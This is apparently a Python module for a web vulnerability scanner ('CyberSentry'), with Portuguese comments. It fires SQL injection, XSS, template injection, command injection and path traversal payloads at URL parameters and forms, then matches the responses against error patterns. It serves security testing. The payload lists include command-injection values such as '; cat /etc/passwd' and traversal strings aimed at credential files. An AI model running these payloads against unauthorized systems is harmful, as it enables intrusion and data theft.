"""CyberSentry Fuzzer — Sub-módulo de testes de injeção ativos.

Testa SQL Injection (error-based + time-based), XSS (reflected + DOM),
Server-Side Template Injection (SSTI), Command Injection e Path Traversal
em todos os pontos de entrada descobertos pelo crawler.

⚠️  Use APENAS em alvos dos quais você tenha autorização explícita.
    Estes testes enviam payloads reais que podem alterar comportamento do alvo.
"""

from __future__ import annotations

import asyncio
import logging
import re
import time
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: list[dict[str, str]] = [
    {"payload": "' OR '1'='1", "type": "error-based"},
    {"payload": "' OR '1'='1'--", "type": "error-based"},
    {"payload": '" OR "1"="1"--', "type": "error-based"},
    {"payload": "1' AND 1=1--", "type": "boolean-based"},
    {"payload": "1' AND 1=2--", "type": "boolean-based"},
    {"payload": "' UNION SELECT NULL--", "type": "union-based"},
    {"payload": "' UNION SELECT NULL,NULL--", "type": "union-based"},
    {"payload": "1; WAITFOR DELAY '0:0:3'--", "type": "time-based"},
    {"payload": "1' AND SLEEP(3)--", "type": "time-based"},
    {"payload": "1' AND pg_sleep(3)--", "type": "time-based"},
    {"payload": "1' OR BENCHMARK(5000000,SHA1('test'))--", "type": "time-based"},
    {"payload": "admin'--", "type": "auth-bypass"},
    {"payload": "' OR 1=1 LIMIT 1--", "type": "auth-bypass"},
]

SQLI_ERROR_PATTERNS: list[str] = [
    r"mysql_fetch", r"mysql_num_rows", r"mysql_query",
    r"You have an error in your SQL syntax",
    r"Warning.*mysql_", r"MySQLSyntaxErrorException",
    r"Unclosed quotation mark",
    r"Microsoft OLE DB Provider",
    r"ODBC SQL Server Driver",
    r"SQLServer JDBC Driver", r"com\.microsoft\.sqlserver",
    r"ORA-\d{5}", r"Oracle.*Driver", r"oracle\.jdbc",
    r"PostgreSQL.*ERROR", r"pg_query", r"pg_exec",
    r"SQLite3?::SQLException", r"SQLITE_ERROR",
    r"unterminated string", r"syntax error",
    r"SQL syntax.*MySQL", r"valid MySQL result",
    r"javax\.persistence", r"hibernate",
    r"org\.hibernate\.QueryException",
    r"PSQLException", r"relation.*does not exist",
    r"OperationalError",
    r"ProgrammingError",
    r"near \".*\": syntax error",
]

XSS_PAYLOADS: list[dict[str, str]] = [
    {"payload": "<script>alert('XSS')</script>", "type": "basic"},
    {"payload": "<img src=x onerror=alert('XSS')>", "type": "img-onerror"},
    {"payload": "<svg onload=alert('XSS')>", "type": "svg-onload"},
    {"payload": "'\"><script>alert('XSS')</script>", "type": "breakout"},
    {"payload": "<body onload=alert('XSS')>", "type": "body-onload"},
    {"payload": "javascript:alert('XSS')", "type": "js-protocol"},
    {"payload": "<input onfocus=alert('XSS') autofocus>", "type": "autofocus"},
    {"payload": "<details open ontoggle=alert('XSS')>", "type": "details"},
    {"payload": "'-alert('XSS')-'", "type": "js-context"},
    {"payload": "\";alert('XSS');//", "type": "js-string-break"},
    # Polyglots compactos
    {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//",
     "type": "polyglot"},
]

SSTI_PAYLOADS: list[dict[str, Any]] = [
    {"payload": "{{7*7}}", "expected": "49", "engine": "Jinja2/Twig"},
    {"payload": "${7*7}", "expected": "49", "engine": "FreeMarker/Mako"},
    {"payload": "<%= 7*7 %>", "expected": "49", "engine": "ERB/EJS"},
    {"payload": "#{7*7}", "expected": "49", "engine": "Ruby/Slim"},
    {"payload": "{{7*'7'}}", "expected": "7777777", "engine": "Jinja2"},
    {"payload": "${7*7}", "expected": "49", "engine": "Spring EL"},
    {"payload": "@(7*7)", "expected": "49", "engine": "Razor"},
    {"payload": "{{config}}", "expected": "Config", "engine": "Jinja2-config-leak"},
    {"payload": "{{self.__class__}}", "expected": "class", "engine": "Jinja2-class-leak"},
]

CMDI_PAYLOADS: list[dict[str, str]] = [
    {"payload": "; whoami", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "| whoami", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "& whoami", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "`whoami`", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "$(whoami)", "marker": "root|www-data|nginx|apache|admin|Administrator"},
    {"payload": "; id", "marker": r"uid=\d+"},
    {"payload": "| id", "marker": r"uid=\d+"},
    {"payload": "; cat /etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "| type C:\\Windows\\win.ini", "marker": r"\[fonts\]|\[extensions\]"},
    {"payload": "; echo CORTANA_SENTRY_MARKER", "marker": "CORTANA_SENTRY_MARKER"},
    {"payload": "| echo CORTANA_SENTRY_MARKER", "marker": "CORTANA_SENTRY_MARKER"},
]

PATH_TRAVERSAL_PAYLOADS: list[dict[str, str]] = [
    {"payload": "../../etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "../../../etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "....//....//etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "..%2f..%2f..%2fetc%2fpasswd", "marker": r"root:.*:0:0"},
    {"payload": "..\\..\\..\\windows\\win.ini", "marker": r"\[fonts\]|\[extensions\]"},
    {"payload": "..%5c..%5c..%5cwindows%5cwin.ini", "marker": r"\[fonts\]|\[extensions\]"},
    {"payload": "/etc/passwd", "marker": r"root:.*:0:0"},
    {"payload": "file:///etc/passwd", "marker": r"root:.*:0:0"},
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _build_session() -> requests.Session:
    s = requests.Session()
    s.headers["User-Agent"] = "CortanaSentry/2.0"
    s.verify = False
    s.timeout = 10
    return s


def _extract_params_from_url(url: str) -> dict[str, str]:
    """Extrai parâmetros de query string da URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    return {k: v[0] for k, v in qs.items()}


def _inject_param(url: str, param: str, payload: str) -> str:
    """Substitui valor de um parâmetro na URL pelo payload."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    qs[param] = [payload]
    new_query = urlencode({k: v[0] for k, v in qs.items()})
    return parsed._replace(query=new_query).geturl()


# ---------------------------------------------------------------------------
# SQL Injection Tester
# ---------------------------------------------------------------------------

async def test_sqli(
    url: str,
    params: dict[str, str] | None = None,
    forms: list[dict[str, Any]] | None = None,
) -> list[dict[str, Any]]:
    """Testa SQL Injection em parâmetros GET e formulários POST."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    # GET params
    target_params = params or _extract_params_from_url(url)
    for param_name, original_value in target_params.items():
        for payload_info in SQLI_PAYLOADS:
            payload = payload_info["payload"]
            ptype = payload_info["type"]

            if ptype == "time-based":
                injected_url = _inject_param(url, param_name, payload)
                try:
                    start = time.time()
                    resp = await loop.run_in_executor(
                        None, lambda u=injected_url: session.get(u, timeout=15)
                    )
                    elapsed = time.time() - start
                    if elapsed >= 2.5:
                        findings.append({
                            "type": "SQLi",
                            "subtype": "time-based blind",
                            "severity": "CRITICAL",
                            "param": param_name,
                            "method": "GET",
                            "payload": payload,
                            "evidence": f"Tempo de resposta: {elapsed:.2f}s (esperado >2.5s)",
                            "url": injected_url,
                            "attack_scenario": (
                                "Um atacante pode extrair dados do banco de dados inteiro "
                                "caractere por caractere usando técnicas de blind SQLi com "
                                "SLEEP/WAITFOR, inclusive senhas, emails e dados financeiros "
                                "de todos os clientes sem deixar rastro nos logs da aplicação."
                            ),
                        })
                        break  # um basta pra esse param
                except Exception:
                    continue
            else:
                injected_url = _inject_param(url, param_name, payload)
                try:
                    resp = await loop.run_in_executor(
                        None, lambda u=injected_url: session.get(u, timeout=10)
                    )
                    body = resp.text
                    for pattern in SQLI_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append({
                                "type": "SQLi",
                                "subtype": f"error-based ({ptype})",
                                "severity": "CRITICAL",
                                "param": param_name,
                                "method": "GET",
                                "payload": payload,
                                "evidence": f"Padrão de erro SQL detectado: `{pattern}`",
                                "url": injected_url,
                                "attack_scenario": (
                                    "O servidor expõe erros de SQL diretamente na resposta HTTP. "
                                    "Um atacante pode usar UNION-based ou error-based SQLi para "
                                    "extrair tabelas inteiras do banco de dados corporativo, "
                                    "incluindo credenciais de administradores e dados financeiros."
                                ),
                            })
                            break
                    else:
                        continue
                    break  # encontrou neste param, pula pro próximo
                except Exception:
                    continue

    # POST forms
    if forms:
        for form in forms:
            form_action = form.get("action", "")
            form_url = urljoin(url, form_action) if form_action else url
            form_method = form.get("method", "GET").upper()
            fields = form.get("fields", [])

            if form_method != "POST":
                continue

            for fld in fields:
                fname = fld.get("name", "")
                if not fname or fld.get("type") in ("hidden", "submit", "button", "file"):
                    continue

                for payload_info in SQLI_PAYLOADS[:6]:  # testar os primeiros payloads
                    payload = payload_info["payload"]
                    post_data = {f.get("name", ""): f.get("value", "test") for f in fields}
                    post_data[fname] = payload

                    try:
                        resp = await loop.run_in_executor(
                            None, lambda: session.post(form_url, data=post_data, timeout=10)
                        )
                        body = resp.text
                        for pattern in SQLI_ERROR_PATTERNS:
                            if re.search(pattern, body, re.IGNORECASE):
                                findings.append({
                                    "type": "SQLi",
                                    "subtype": "error-based (POST form)",
                                    "severity": "CRITICAL",
                                    "param": fname,
                                    "method": "POST",
                                    "payload": payload,
                                    "evidence": f"Padrão de erro SQL em `{form_url}`: `{pattern}`",
                                    "url": form_url,
                                    "attack_scenario": (
                                        "Formulários POST vulneráveis a SQL Injection permitem "
                                        "bypass de autenticação (login admin sem senha), "
                                        "extração massiva de dados e até execução de comandos "
                                        "no sistema operacional do servidor via xp_cmdshell ou "
                                        "INTO OUTFILE."
                                    ),
                                })
                                break
                    except Exception:
                        continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# XSS Tester
# ---------------------------------------------------------------------------

async def test_xss(
    url: str,
    params: dict[str, str] | None = None,
    forms: list[dict[str, Any]] | None = None,
) -> list[dict[str, Any]]:
    """Testa XSS Reflected em parâmetros GET e formulários POST."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    for param_name in target_params:
        for payload_info in XSS_PAYLOADS:
            payload = payload_info["payload"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if payload in resp.text:
                    findings.append({
                        "type": "XSS",
                        "subtype": f"reflected ({payload_info['type']})",
                        "severity": "HIGH",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": f"Payload refletido sem sanitização no HTML de resposta",
                        "url": injected_url,
                        "attack_scenario": (
                            "Um atacante pode criar um link malicioso com o payload XSS embutido "
                            "e enviar por email/WhatsApp para funcionários ou clientes da empresa. "
                            "Ao clicar, o script executa no navegador da vítima, roubando cookies "
                            "de sessão (Account Takeover), redirecionando para páginas falsas de "
                            "login ou instalando keyloggers invisíveis."
                        ),
                    })
                    break
            except Exception:
                continue

    # POST forms
    if forms:
        for form in forms:
            form_action = form.get("action", "")
            form_url = urljoin(url, form_action) if form_action else url
            fields = form.get("fields", [])

            for fld in fields:
                fname = fld.get("name", "")
                if not fname or fld.get("type") in ("hidden", "submit", "button", "file"):
                    continue

                for payload_info in XSS_PAYLOADS[:5]:
                    payload = payload_info["payload"]
                    post_data = {f.get("name", ""): f.get("value", "test") for f in fields}
                    post_data[fname] = payload

                    try:
                        resp = await loop.run_in_executor(
                            None, lambda: session.post(form_url, data=post_data, timeout=10)
                        )
                        if payload in resp.text:
                            findings.append({
                                "type": "XSS",
                                "subtype": f"reflected POST ({payload_info['type']})",
                                "severity": "HIGH",
                                "param": fname,
                                "method": "POST",
                                "payload": payload,
                                "evidence": f"Payload XSS refletido em `{form_url}`",
                                "url": form_url,
                                "attack_scenario": (
                                    "Formulários que refletem input do usuário sem sanitização "
                                    "são alvos de Stored XSS quando persistidos no banco. "
                                    "Atacantes injetam scripts permanentes que afetam TODOS "
                                    "os usuários que acessarem a página."
                                ),
                            })
                            break
                    except Exception:
                        continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# SSTI Tester
# ---------------------------------------------------------------------------

async def test_ssti(
    url: str,
    params: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Testa Server-Side Template Injection em parâmetros GET."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    for param_name in target_params:
        for payload_info in SSTI_PAYLOADS:
            payload = payload_info["payload"]
            expected = payload_info["expected"]
            engine = payload_info["engine"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if expected.lower() in resp.text.lower() and payload not in resp.text:
                    findings.append({
                        "type": "SSTI",
                        "subtype": f"confirmed ({engine})",
                        "severity": "CRITICAL",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": f"O template engine processou `{payload}` e retornou `{expected}`",
                        "url": injected_url,
                        "attack_scenario": (
                            f"O servidor utiliza {engine} e avalia expressões injetadas. "
                            "Um atacante pode escalar de SSTI para Remote Code Execution (RCE) "
                            "completo no servidor, executando comandos arbitrários como "
                            "`os.popen('cat /etc/passwd').read()` ou extraindo variáveis de "
                            "ambiente com credenciais de banco de dados e API keys."
                        ),
                    })
                    break
            except Exception:
                continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# Command Injection Tester
# ---------------------------------------------------------------------------

async def test_cmdi(
    url: str,
    params: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Testa Command Injection em parâmetros GET."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    for param_name in target_params:
        for payload_info in CMDI_PAYLOADS:
            payload = payload_info["payload"]
            marker = payload_info["marker"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if re.search(marker, resp.text):
                    findings.append({
                        "type": "Command Injection",
                        "subtype": "OS command execution",
                        "severity": "CRITICAL",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": f"Output de comando do sistema detectado na resposta",
                        "url": injected_url,
                        "attack_scenario": (
                            "O atacante tem execução de comandos direta no sistema "
                            "operacional do servidor. Isso permite: instalar backdoors, "
                            "exfiltrar TODA a base de dados, pivotar para a rede interna "
                            "da empresa, instalar ransomware e ter controle total "
                            "da infraestrutura."
                        ),
                    })
                    break
            except Exception:
                continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# Path Traversal / LFI
# ---------------------------------------------------------------------------

async def test_path_traversal(
    url: str,
    params: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Testa LFI / Path Traversal em parâmetros GET."""
    findings: list[dict[str, Any]] = []
    session = _build_session()
    loop = asyncio.get_event_loop()

    target_params = params or _extract_params_from_url(url)
    # Focar em parâmetros que sugerem file inclusion
    file_param_hints = ("file", "path", "page", "doc", "document", "template",
                        "include", "load", "read", "view", "lang", "dir",
                        "folder", "module", "content", "url", "src")

    for param_name in target_params:
        # Testar todos, mas priorizar nomes sugestivos
        for payload_info in PATH_TRAVERSAL_PAYLOADS:
            payload = payload_info["payload"]
            marker = payload_info["marker"]
            injected_url = _inject_param(url, param_name, payload)
            try:
                resp = await loop.run_in_executor(
                    None, lambda u=injected_url: session.get(u, timeout=10)
                )
                if re.search(marker, resp.text):
                    findings.append({
                        "type": "Path Traversal / LFI",
                        "subtype": "local file read",
                        "severity": "CRITICAL",
                        "param": param_name,
                        "method": "GET",
                        "payload": payload,
                        "evidence": f"Conteúdo de arquivo local sensível detectado na resposta",
                        "url": injected_url,
                        "attack_scenario": (
                            "O atacante pode ler qualquer arquivo do servidor: "
                            "/etc/passwd, /etc/shadow, arquivos de configuração com "
                            "senhas de banco de dados, chaves SSH privadas e código-fonte "
                            "da aplicação. Com LFI e log poisoning, pode escalar para "
                            "Remote Code Execution (RCE)."
                        ),
                    })
                    break
            except Exception:
                continue

    session.close()
    return findings


# ---------------------------------------------------------------------------
# Orquestrador — Fuzz All Inputs
# ---------------------------------------------------------------------------

async def fuzz_all_inputs(
    url: str,
    params: dict[str, str] | None = None,
    forms: list[dict[str, Any]] | None = None,
    callback=None,
) -> list[dict[str, Any]]:
    """Executa TODOS os testes de injeção em todos os pontos de entrada encontrados."""
    all_findings: list[dict[str, Any]] = []

    if callback:
        await callback("💉 Fase Fuzzing — Testando SQL Injection...")
    sqli = await test_sqli(url, params, forms)
    all_findings.extend(sqli)
    if sqli and callback:
        await callback(f"🔴 {len(sqli)} possíveis SQLi encontradas!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando XSS Reflected...")
    xss = await test_xss(url, params, forms)
    all_findings.extend(xss)
    if xss and callback:
        await callback(f"🟠 {len(xss)} possíveis XSS encontrados!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando SSTI...")
    ssti = await test_ssti(url, params)
    all_findings.extend(ssti)
    if ssti and callback:
        await callback(f"🔴 {len(ssti)} possíveis SSTI encontradas!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando Command Injection...")
    cmdi = await test_cmdi(url, params)
    all_findings.extend(cmdi)
    if cmdi and callback:
        await callback(f"🔴 {len(cmdi)} possíveis Command Injections!")

    if callback:
        await callback("💉 Fase Fuzzing — Testando Path Traversal / LFI...")
    lfi = await test_path_traversal(url, params)
    all_findings.extend(lfi)
    if lfi and callback:
        await callback(f"🔴 {len(lfi)} possíveis LFI/Path Traversals!")

    return all_findings
